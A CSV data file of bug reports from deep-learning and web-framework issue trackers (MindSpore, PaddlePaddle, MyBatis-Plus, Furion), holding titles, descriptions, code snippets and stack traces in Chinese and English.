title,text
[CT][MS][CI] TypeError: bprop() takes 5 positional arguments but 7 were given,": /device gpu : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : test_bprop_inlinebprop_mutil_crosscell_1 test_bprop_inlinebprop_mutil_crosscell_2 test_bprop_inlinebprop_mutil_crosscell_3 test_ctrl_if_while_bprop_true pass   <code>: def test_bprop_inlinebprop_mutil_crosscell_2(): net = InlineBpropMutilCrossCell2() input1 = Tensor(np.ones([2, 2]).astype(np.float32)) input2 = Tensor(np.ones([2, 2]).astype(np.float32)) &gt; grads = get_bprop_grads(net, input1, input2) ../interface/backward/test_bprop.py:928: _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ ../interface/backward/test_bprop.py:38: in get_bprop_grads grads = grad_net(input1, input2) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:403: in __call__ output = self.run_construct(cast_inputs, kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/nn/cell.py:344: in run_construct output = self.construct(*cast_inputs, **kwargs) ../share/grad.py:27: in construct return self.grad(self.network)(*inputs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:75: in wrapper results = fn(*arg, **kwargs) /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/ops/composite/base.py:377: in after_grad out = _pynative_exec(fn, *args, **kwargs) _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ _ self = &lt;mindspore.common.api._PynativeExecutor object at 0x7f96fa619650&gt; obj = InlineBpropMutilCrossCell2&lt; (f1): TwoInputBprop&lt;&gt; (f3): TwoInputBprop&lt;&gt; (f5): TwoInputBprop&lt;&gt; (f2): TwoInput&lt;&gt; (f4): TwoInput&lt;&gt; (f6): TwoInput&lt;&gt; &gt; args = (Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 1.00000000e+00], [ 1.00000000e+00, 1.00000000e+00]]), Tensor(shape=[2, 2], dtype=Float32, value= [[ 1.00000000e+00, 1.00000000e+00], [ 1.00000000e+00, 1.00000000e+00]])) kwargs = {} def __call__(self, obj, *args, **kwargs): args = args + tuple(kwargs.values()) &gt; return self._executor(obj, args) E TypeError: bprop() takes 5 positional arguments but 7 were given /root/miniconda3/envs/ci3.7/lib/python3.7/site-packages/mindspore/common/api.py:425: TypeError ----------------------------- Captured stdout call -----------------------------"
显存超限调试办法,"如果减小batch size不能解决问题，请确认下需要初始化的variable的shape, 排除网络配置错误。   <code>: for var in startup_prog.list_vars(): print('var name: {}; shape: {}'.format(var.name, var.shape))"
Fleet分布式保存0号机和1号机保存参数权值diff很大,利用fleet transpiler模式分布式训练的时候，利用方法保存模型参数， 0号机保存的权值和1号机保存的权值diff很大 有以下两个问题： 如何保存参数，以哪台机子为准 如何利用保存参数做分布式预测   <code>: fluid.save_persistable
"[CT][MS][doc] When run for API AllReduce、AllGather、Broadcast、ReduceOp、ReduceScatter, example is failed.",": Ascend /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : https://www.mindspore.cn/docs/api/en/master/api_python/ops/mindspore.ops.AllReduce.html?highlight=allreduce#mindspore.ops.AllReduce 这AllReduce、AllGather、Broadcast、ReduceOp、ReduceScatter，五个 直接拷贝测试样例后，在Ascend环境，用python，直接执行，出现RANK_ID错误 1，在官网ops算子，说明文档中加入Ascend分布式的简单说明，或者Ascend分布式的链接 2，类似https://e.gitee.com/mind_spore/issues/list?tab=files&amp;issue=I4KKV2   <code>: (vm3.7) [root@localhost doc]# python aaa.py Traceback (most recent call last): File ""aaa.py"", line 9, in &lt;module&gt; init() File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/communication/management.py"", line 135, in init _check_parallel_envs() File ""/root/archiconda3/envs/vm3.7/lib/python3.7/site-packages/mindspore/communication/management.py"", line 71, in _check_parallel_envs raise RuntimeError(""Environment variables RANK_ID has not been exported, please export variables 'RANK_ID'."") RuntimeError: Environment variables RANK_ID has not been exported, please export variables 'RANK_ID'."
"blas_impl.h:747: Expected dim_a.width_ == dim_b.height_, but received dim_a.width_:1 != dim_b.height_:784","报错提示：[Hint: Expected dim_a.width_ == dim_b.height_, but received dim_a.width_:1 != dim_b.height_:784.] at (/paddle/paddle/fluid/operators/math/blas_impl.h:747) 错误发生在：课节5：第二章一个案例吃透深度学习(上)：[项目]2.通过极简方案快速构建手写数字识别模型 将所有的教程代码，写到一个model.py文件，并在ai studio运行python model.py,最后预测: 预测输出取整，即为预测的数字，打印结果 notebook教程里正常运行 项目地址：https://aistudio.baidu.com/bjcpu/user/52668/719950/notebooks/719950.ipynb   <code>: print(""本次预测的数字是"", result.numpy().astype('int32'))的时候出现这个错误"
GPU版本和CPU版本的LayerNorm反向传播梯度不一致,"您好，我在测试paddle的LayerNorm发现了一个问题 环境：2080Ti，cuda11.2 安装paddlepaddle-gpu（cuda11.2版本） 使用下面的测试代码 我这里得到的结果是 若安装CPU版本，得到结果是 经过验证，cpu版本下运算得到的梯度是正确的，感觉是计算存在某些bug   <code>: import paddle import numpy as np x = np.array([[[[-1.83965693, -1.82964566]]]]).astype(np.float32) x_tensor = paddle.to_tensor(x).cpu() # x_tensor = paddle.to_tensor(x).cuda() x_tensor.stop_gradient = False layernorm = paddle.nn.LayerNorm(normalized_shape=(1, 1, 2), epsilon=1e-5) out = layernorm(x_tensor) print(""Out is: "", out) out = out.sum() out.backward() print(""X grad is: "", x_tensor.grad) Out is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CUDAPlace(0), stop_gradient=False, [[[[-0.84284753, 0.84282744]]]]) X grad is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CUDAPlace(0), stop_gradient=False, [[[[-21.41206169, 21.41332817]]]]) Out is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CPUPlace, stop_gradient=False, [[[[-0.84543723, 0.84541708]]]]) X grad is: Tensor(shape=[1, 1, 1, 2], dtype=float32, place=CPUPlace, stop_gradient=False, [[[[-0.00143835, 0.00143831]]]])"
sql解析,"当前使用版本 3.1.0 该问题是怎么引起的？**** SELECT id FROM WHERE !( (trigger_code in (0, 200) and handle_code = 0) OR (handle_code = 200) ) AND = 0 ORDER BY id ASC; SELECT t.* FROM TBL_JOB_TRIGGER_GROUP AS t WHERE t.address_type = #{addressType} ORDER BY t.order ASC; SELECT t.* FROM TBL_JOB_TRIGGER_REGISTRY AS t WHERE t.update_time ]]&gt; DATE_ADD(NOW(),INTERVAL -#{timeout} SECOND); 执行以上三条sql语句会浮现 Caused by: com.baomidou.mybatisplus.core.exceptions.MybatisPlusException: Failed to process, please exclude the tableName or statementId.   <code>: TBL_JOB_TRIGGER_LOG alarm_status"
[CT][MS][OCCM][BatchMatMul][api mapping] The example in api mapping document of torch_diff BatchMatMul has error.,"The example in api mapping document of BatchMatMul has error The example in api mapping document of BatchMatMul has error / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode pynative /mode graph BatchMatMul api映射样例： 使用doctest测试样例 结果有误,空格差异   <code>: # PyTorch import numpy as np import torch from torch import tensor input = torch.tensor(np.ones(shape=[2, 1, 4]), dtype=torch.float32) mat2 = torch.tensor(np.ones(shape=[2, 4, 2]), dtype=torch.float32) output = torch.bmm(input, mat2).numpy() print(output) # [[[4. 4.]] # [[4. 4.]]] # MindSpore import numpy as np import mindspore import mindspore.ops as ops from mindspore import Tensor x = Tensor(np.ones(shape=[2, 1, 4]), mindspore.float32) y = Tensor(np.ones(shape=[2, 4, 2]), mindspore.float32) batmatmul = ops.BatchMatMul() output = batmatmul(x, y) print(output) # [[[4. 4.]] # [[4. 4.]]] Trying: batmatmul = ops.BatchMatMul() Expecting nothing ok Trying: output = batmatmul(x, y) Expecting nothing ok Trying: print(output) Expecting: [[[4. 4.]] [[4. 4.]]] ********************************************************************** File ""/home/jenkins-slave/workspace/ME_Excutor_DOC_Daily_EulerOS_OpenSource_CPU/test_log/example_testing_temp.py"", line 23, in example_testing_temp Failed example: print(output) Expected: [[[4. 4.]] [[4. 4.]]] Got: [[[4. 4.]] &lt;BLANKLINE&gt; [[4. 4.]]] ********************************************************************** 1 items had failures: 2 of 16 in example_testing_temp 16 tests in 1 items. 14 passed and 2 failed. ***Test Failed*** 2 failures. ==================== 1 failed in 1minutes ====================== ### end api_mapping.pytorch_diff.BatchMatMul ###"
1000x slower than tensorflow when reducing large array,"Here is the paddle code: Here is the equivalent tensorflow code test on TITAN X, 3s per loop in paddle and 3ms per loop in tensorflow. After some digging, paddle reduce mean by using eigen, and tf reduce mean by using cub, I think it is the reason that causes this issue.   <code>: import os os.environ['CUDA_VISIBLE_DEVICES'] = '1' import paddle import paddle.fluid as fluid sp = fluid.Program() tp = fluid.Program() image_shape = [50* 1000 * 2000] def foo(input): mean = fluid.layers.reduce_mean(input, dim=0, keep_dim=True) return input-mean with fluid.program_guard(tp, sp): x = fluid.layers.data(name='img', shape=image_shape, dtype='float32', append_batch_size=False) for i in range(10): x = foo(x) ttp = tp.clone(True) fluid.release_memory(ttp, skip_opt_set=[x.name]) exe = fluid.Executor(fluid.CUDAPlace(0)) exe.run(sp) imgs = np.zeros(image_shape).astype('float32') result = exe.run(tp, feed={'img':imgs*1}, fetch_list=[x]) import os os.environ['CUDA_VISIBLE_DEVICES'] = '0' import tensorflow as tf import numpy as np image_shape = [50* 1000 * 2000] x = tf.placeholder(""float"", image_shape) y = x for i in range(1000): mean = tf.reduce_mean(y, axis=0) y = y - mean init = tf.global_variables_initializer() with tf.Session() as sess: sess.run(init) data = np.zeros(image_shape) for i in range(5): sess.run(y, feed_dict={x:data})"
跑ci-server的ci流程时，耗时30分钟，任务正常结束，但是界面上仍为执行中，服务日志报错，Read timed out,服务日志：   <code>: 2021-06-26 19:34:06.666 ERROR 1 --- [ream-1868281130] c.g.d.api.async.ResultCallbackTemplate : Error during callback java.net.SocketTimeoutException: Read timed out at java.base/java.net.SocketInputStream.socketRead0(Native Method) ~[na:na] at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:168) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:140) ~[na:na] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.fillBuffer(SessionInputBufferImpl.java:149) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.readLine(SessionInputBufferImpl.java:280) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.getChunkSize(ChunkedInputStream.java:261) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.nextChunk(ChunkedInputStream.java:222) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.read(ChunkedInputStream.java:147) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.io.EofSensorInputStream.read(EofSensorInputStream.java:118) ~[httpcore5-5.1.1.jar:5.1.1] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:30) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:12) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:275) ~[docker-java-core-3.2.8.jar:na] at java.base/java.lang.Thread.run(Thread.java:829) ~[na:na] 2021-06-26 19:34:06.667 ERROR 1 --- [ asyncTask-10] dev.jianmu.infrastructure.AppConfig : Async方法执行异常 java.lang.RuntimeException: java.net.SocketTimeoutException: Read timed out at com.github.dockerjava.api.async.ResultCallbackTemplate.throwFirstError(ResultCallbackTemplate.java:158) ~[docker-java-api-3.2.8.jar:na] at com.github.dockerjava.api.async.ResultCallbackTemplate.awaitCompletion(ResultCallbackTemplate.java:93) ~[docker-java-api-3.2.8.jar:na] at dev.jianmu.infrastructure.docker.EmbeddedDockerWorker.runTask(EmbeddedDockerWorker.java:196) ~[infrastructure-1.0-SNAPSHOT.jar:na] at dev.jianmu.infrastructure.docker.EmbeddedDockerWorker$$FastClassBySpringCGLIB$$1570030c.invoke(&lt;generated&gt;) ~[infrastructure-1.0-SNAPSHOT.jar:na] at org.springframework.cglib.proxy.MethodProxy.invoke(MethodProxy.java:218) ~[spring-core-5.3.8.jar:5.3.8] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.invokeJoinpoint(CglibAopProxy.java:779) ~[spring-aop-5.3.8.jar:5.3.8] at org.springframework.aop.framework.ReflectiveMethodInvocation.proceed(ReflectiveMethodInvocation.java:163) ~[spring-aop-5.3.8.jar:5.3.8] at org.springframework.aop.framework.CglibAopProxy$CglibMethodInvocation.proceed(CglibAopProxy.java:750) ~[spring-aop-5.3.8.jar:5.3.8] at org.springframework.aop.interceptor.AsyncExecutionInterceptor.lambda$invoke$0(AsyncExecutionInterceptor.java:115) ~[spring-aop-5.3.8.jar:5.3.8] at java.base/java.util.concurrent.FutureTask.run(FutureTask.java:264) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1128) ~[na:na] at java.base/java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:628) ~[na:na] at java.base/java.lang.Thread.run(Thread.java:829) ~[na:na] Caused by: java.net.SocketTimeoutException: Read timed out at java.base/java.net.SocketInputStream.socketRead0(Native Method) ~[na:na] at java.base/java.net.SocketInputStream.socketRead(SocketInputStream.java:115) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:168) ~[na:na] at java.base/java.net.SocketInputStream.read(SocketInputStream.java:140) ~[na:na] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.fillBuffer(SessionInputBufferImpl.java:149) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.SessionInputBufferImpl.readLine(SessionInputBufferImpl.java:280) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.getChunkSize(ChunkedInputStream.java:261) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.nextChunk(ChunkedInputStream.java:222) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.impl.io.ChunkedInputStream.read(ChunkedInputStream.java:147) ~[httpcore5-5.1.1.jar:5.1.1] at org.apache.hc.core5.http.io.EofSensorInputStream.read(EofSensorInputStream.java:118) ~[httpcore5-5.1.1.jar:5.1.1] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:30) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.FramedInputStreamConsumer.accept(FramedInputStreamConsumer.java:12) ~[docker-java-core-3.2.8.jar:na] at com.github.dockerjava.core.DefaultInvocationBuilder.lambda$executeAndStream$1(DefaultInvocationBuilder.java:275) ~[docker-java-core-3.2.8.jar:na] ... 1 common frames omitted
"saas多租户模式-独立database模式下无法获取Tenant, 导致无法自动切换的问题","Furion 1.15.9 webapi项目 postgresql 问题描述: 按照文档中的多租户的独立database模式编写代码, 发现没有切换到指定的数据库.经调试,发现 在 FurionDbContext 类中,以下返回 之后返回默认的连接字符串. public string GetDatabaseConnectionString() { return base.Tenant?.ConnectionString??""默认链接字符串""; } 证明base.Tenant 返回的是空. 翻看最新的源代码和1.15版本的代码,发现已经做了改进. 以下是1.15版本的代码AppDbContext 的 Tenant属性代码. get { // 如果没有实现多租户方式，则无需查询 if (Db.CustomizeMultiTenants || !typeof(IPrivateMultiTenant).IsAssignableFrom(GetType())) return default; 将以上代码部分拷贝到 自己的项目代码中, 进行调试. 发现 在调试过程中 调试器 断点到 &gt;&gt;&gt;&gt; 指向代码时, 并不往下执行, 而是直接跳出.执行后续的代码 改写 在&gt;&gt;&gt;&gt; 指向的代码上 增加 var cnt = tenantDbContext.Set().count() 代码. 发现 新增加的语句也一样. 执行到这段代码后, 不继续执行, 直接跳出. 此问题不知是调试器问题,还是我配置的问题. 分析到此处, 没有找到具体原因. 具体问题是. 使用的base.Tenant 为什么是null. 这种情况是否正常.如果不正常, 是什么原因造成的. 文档中的多租户独立database模式. 的样例代码, 具体没有完成切换是什么原因. 以下是我的代码, 和文档中完全一致的, 我就不贴了, 我把 写的entity类和 service 贴出来. public class B_User : IEntity { [Key] public long buid { get; set; } public class LoginService : ILoginService, ITransient { private readonly IRepository&lt;B_User, MultiTenantDbContextLocator&gt; _userRepository;   <code>: // 判断 HttpContext 是否存在 var httpContext = App.HttpContext; if (httpContext == null) return default; // 获取主机地址 var host = httpContext.Request.Host.Value; // 从内存缓存中读取或查询数据库 var memoryCache = App.GetService&lt;IMemoryCache&gt;(); return memoryCache.GetOrCreate($""{host}:MultiTenants"", cache =&gt; { // 读取数据库 var tenantDbContext = Db.GetNewDbContext&lt;MultiTenantDbContextLocator&gt;(); if (tenantDbContext == null) return default; &gt;&gt;&gt;&gt; return tenantDbContext.Set&lt;Tenant&gt;().FirstOrDefault(u =&gt; u.Host == host); }); } public String usercode { get; set; } public String username { get; set; } public String userphone { get; set; } public String password { get; set; } } public LoginService(IRepository&lt;B_User, MultiTenantDbContextLocator&gt; userRepository) { _userRepository = userRepository; } public async Task&lt;string&gt; loginAsync(string usercode, string passwd, string checkcode) { B_User _user = _userRepository.Where(p =&gt; p.usercode == usercode).FirstOrDefault(); if(_user != null) { ""查询到结果信息"".LogInformation(""""); } else { _user = new B_User(); _user.buid = SnowIDHelper.genSnowID(); _user.usercode = usercode; await _userRepository.InsertAsync(_user); } ""测试日志"".LogError(""""); return ""ok""; } }"
